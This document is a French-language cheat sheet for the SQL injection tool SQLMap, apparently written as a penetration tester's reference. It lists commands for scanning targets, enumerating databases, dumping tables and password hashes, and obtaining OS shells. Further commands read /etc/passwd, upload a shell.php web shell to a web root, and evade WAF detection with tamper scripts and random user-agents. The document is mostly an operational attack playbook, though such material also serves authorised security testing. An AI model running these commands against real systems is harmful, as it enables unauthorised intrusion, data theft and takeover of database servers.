**Objectif :** SQLMap est un outil open-source d'audit de sécurité et de test de pénétration qui automatise le processus de détection et d'exploitation des vulnérabilités d'injection SQL, permettant ainsi de prendre le contrôle des serveurs de bases de données.

**Source :** [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) | [http://sqlmap.org/](http://sqlmap.org/)

**OPSEC :** SQLMap peut générer un trafic très important et suspect. Son utilisation est facilement détectable par les WAFs (Web Application Firewalls), IDS/IPS et les équipes de sécurité si des précautions (tampers, délais, user-agent aléatoire) ne sont pas prises.

---

### 🎯 **Ciblage et Scan de Base**

#### Spécifier une URL cible (paramètre GET)

```bash
sqlmap -u "[http://exemple.com/produits?id=1](http://exemple.com/produits?id=1)"
```

* **Contexte :** Lance un scan de base sur l'URL fournie, testant les paramètres GET (ici `id`).
* **Usage :** Point d'entrée le plus simple pour tester une URL.

#### Spécifier une URL cible avec des données POST

```bash
sqlmap -u "[http://exemple.com/login](http://exemple.com/login)" --data="username=admin&password=pass"
```

* **Contexte :** Teste les paramètres envoyés dans le corps d'une requête POST.
* **Usage :** Pour les formulaires de connexion, de recherche, etc.

#### Analyser une requête depuis un fichier (Burp Suite, ZAP)

```bash
sqlmap -r request.txt
```

* **Contexte :** Lit une requête HTTP complète (y compris les en-têtes, cookies, méthode POST/GET) depuis un fichier texte.
* **Usage :** Très pratique pour rejouer et tester des requêtes complexes interceptées avec un proxy comme Burp Suite ou ZAP.

#### Spécifier un paramètre spécifique à tester

```bash
sqlmap -u "[http://exemple.com/produits?id=1&cat=2](http://exemple.com/produits?id=1&cat=2)" -p id
```

* **Contexte :** Ne teste que le paramètre `id` pour l'injection SQL, ignorant les autres (`cat` ici).
* **Usage :** Accélérer le scan en se concentrant sur un paramètre jugé potentiellement vulnérable.

#### Utiliser un cookie d'authentification

```bash
sqlmap -u "[http://exemple.com/profil?id=1](http://exemple.com/profil?id=1)" --cookie="sessionid=abcdef12345"
```

* **Contexte :** Inclut le cookie spécifié dans toutes les requêtes, permettant de tester des pages nécessitant une authentification.
* **Usage :** Essentiel pour auditer des zones authentifiées d'une application web.

---

### ⚙️ **Ajustement du Scan (Niveau et Risque)**

#### Augmenter le niveau de test (plus de payloads/types d'injection)

```bash
sqlmap -r request.txt --level=5
```

* **Contexte :** Augmente la profondeur des tests. `level` va de 1 (défaut) à 5 (maximum). Un niveau plus élevé teste plus de types d'injections (ex: time-based blind, injections dans les en-têtes comme User-Agent, Referer).
* **Usage :** Pour des scans plus exhaustifs, mais plus lents et potentiellement plus bruyants.

#### Augmenter le risque (tests potentiellement plus dangereux)

```bash
sqlmap -r request.txt --risk=3
```

* **Contexte :** Augmente l'agressivité des tests. `risk` va de 1 (défaut) à 3 (maximum). Un risque plus élevé utilise des payloads qui pourraient potentiellement modifier des données ou causer des erreurs (ex: injections SQL lourdes).
* **Usage :** À utiliser avec prudence, surtout sur des environnements de production.

> \[!Astuce]
> Combiner `--level=5 --risk=3` permet le scan le plus complet possible, mais aussi le plus lent et le plus risqué/bruyant.

---

### 🔎 **Énumération de la Base de Données**

*Une fois qu'une injection est confirmée, ces commandes permettent d'explorer la structure et le contenu de la base de données.*

#### Lister les bases de données disponibles

```bash
sqlmap -r request.txt --dbs
```

#### Lister les tables d'une base de données spécifique

```bash
sqlmap -r request.txt -D <nom_db> --tables
```

#### Lister les colonnes d'une table spécifique

```bash
sqlmap -r request.txt -D <nom_db> -T <nom_table> --columns
```

#### Obtenir l'utilisateur actuel de la base de données

```bash
sqlmap -r request.txt --current-user
```

#### Obtenir le nom de la base de données actuelle

```bash
sqlmap -r request.txt --current-db
```

#### Vérifier si l'utilisateur actuel est administrateur (DBA)

```bash
sqlmap -r request.txt --is-dba
```

#### Tenter de dumper les hashes des mots de passe (si possible)

```bash
sqlmap -r request.txt --passwords
```

* **Prérequis :** Nécessite souvent des privilèges élevés et dépend du type de SGBD.

---

### 💾 **Dump des Données**

#### Dumper le contenu d'une table

```bash
sqlmap -r request.txt -D <nom_db> -T <nom_table> --dump
```

#### Dumper des colonnes spécifiques d'une table

```bash
sqlmap -r request.txt -D <nom_db> -T <nom_table> -C <col1,col2> --dump
```

#### Dumper toutes les tables de toutes les bases de données

```bash
sqlmap -r request.txt --dump-all
```

* **Usage :** Très long et bruyant, à utiliser avec parcimonie.

---

### 💥 **Exploitation (Accès Système)**

> \[!Attention]
> Ces actions sont très intrusives et nécessitent généralement que l'utilisateur de la base de données ait des privilèges très élevés (DBA) et que le SGBD soit configuré de manière permissive.

#### Obtenir un shell interactif sur le système d'exploitation via la base de données

```bash
sqlmap -r request.txt --os-shell
```

* **Contexte :** Tente d'uploader un petit shell (via différentes techniques selon le SGBD : `xp_cmdshell` sur MSSQL, UDF sur MySQL/PostgreSQL, etc.) et d'obtenir une invite de commande interactive sur le serveur hébergeant la base de données.
* **Prérequis :** Privilèges DBA, SGBD et OS compatibles.

#### Exécuter une commande OS unique

```bash
sqlmap -r request.txt --os-cmd="<commande>"
# Exemple: sqlmap -r req.txt --os-cmd="whoami"
```

#### Obtenir un shell SQL interactif

```bash
sqlmap -r request.txt --sql-shell
```

* **Contexte :** Permet d'exécuter des requêtes SQL arbitraires directement sur la base de données.
* **Usage :** Utile pour une exploration manuelle ou des opérations non prévues par les options de dump standard.

#### Lire un fichier sur le serveur

```bash
sqlmap -r request.txt --file-read "<chemin_fichier_distant>"
# Exemple: sqlmap -r req.txt --file-read "/etc/passwd"
```

* **Prérequis :** Privilèges de lecture de fichiers pour l'utilisateur de la base de données (ex: `FILE` sur MySQL, `pg_read_server_files` sur PostgreSQL).

#### Écrire un fichier local sur le serveur

```bash
sqlmap -r request.txt --file-write "<fichier_local>" --file-dest "<chemin_destination_distant>"
# Exemple: sqlmap -r req.txt --file-write "shell.php" --file-dest "/var/www/html/uploads/shell.php"
```

* **Prérequis :** Privilèges d'écriture de fichiers pour l'utilisateur de la base de données.

---

### 🛠️ **Techniques et Tuning**

#### Forcer une technique d'injection spécifique

```bash
sqlmap -r request.txt --technique=<lettre>
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries (rare)
# Exemple: sqlmap -r req.txt --technique=U # Force UNION
```

* **Usage :** Utile si on sait quel type d'injection fonctionne ou pour accélérer le scan en évitant des techniques inutiles.

#### Spécifier le SGBD cible

```bash
sqlmap -r request.txt --dbms=<sgbd>
# Exemples: --dbms=mysql, --dbms=mssql, --dbms=postgresql, --dbms=oracle
```

* **Usage :** Accélère le scan en ne testant que les payloads spécifiques au SGBD indiqué.

#### Augmenter le nombre de threads (parallélisation)

```bash
sqlmap -r request.txt --threads=10
```

* **Usage :** Accélère le scan, mais augmente la charge sur le serveur cible et le risque de détection.

#### Mode non interactif (répond 'oui' par défaut)

```bash
sqlmap -r request.txt --batch
```

* **Usage :** Utile pour les scans automatisés ou longs où l'on ne souhaite pas répondre manuellement aux questions de SQLMap.

#### Utiliser un User-Agent aléatoire

```bash
sqlmap -r request.txt --random-agent
```

* **Usage :** Tente de masquer l'empreinte de SQLMap en utilisant des User-Agents variés.

---

### 🛡️ **Contournement de WAF (Web Application Firewall)**

#### Utiliser des scripts de manipulation (tampers)

```bash
sqlmap -r request.txt --tamper=<script1,script2,...>
```

* **Contexte :** Les tampers modifient les payloads SQL envoyés par SQLMap pour tenter de contourner les règles de détection des WAFs.
* **Usage :** Essentiel lorsque l'application est protégée par un WAF. Il faut souvent tester plusieurs combinaisons.
* **Exemples de tampers courants :**
    * `space2comment` : Remplace les espaces par `/**/`.
    * `base64encode` : Encode le payload en Base64.
    * `chardoubleencode` : Double encodage URL des caractères.
    * `between` : Remplace `>` par `NOT BETWEEN 0 AND`.
    * `randomcase` : Change la casse des mots-clés SQL (ex: `SELECT` -> `SeLeCt`).
* **Lister les tampers disponibles :** `sqlmap --list-tampers`

#### Ajouter un préfixe/suffixe aux payloads

```bash
sqlmap -r request.txt --prefix="')" --suffix="-- -"
```

* **Contexte :** Ajoute des caractères avant (`prefix`) ou après (`suffix`) le payload injecté.
* **Usage :** Utile pour fermer correctement des guillemets ou des parenthèses dans la requête SQL originale, ou pour commenter la fin de la requête.

#### Réinitialiser la session SQLMap (vider le cache)

```bash
sqlmap -r request.txt --flush-session
```

* **Contexte :** SQLMap sauvegarde les résultats et les informations de session pour éviter de refaire les mêmes tests.
* **Usage :** Forcer SQLMap à recommencer les tests depuis le début pour une cible donnée, utile si la configuration a changé ou si on veut essayer des options différentes.
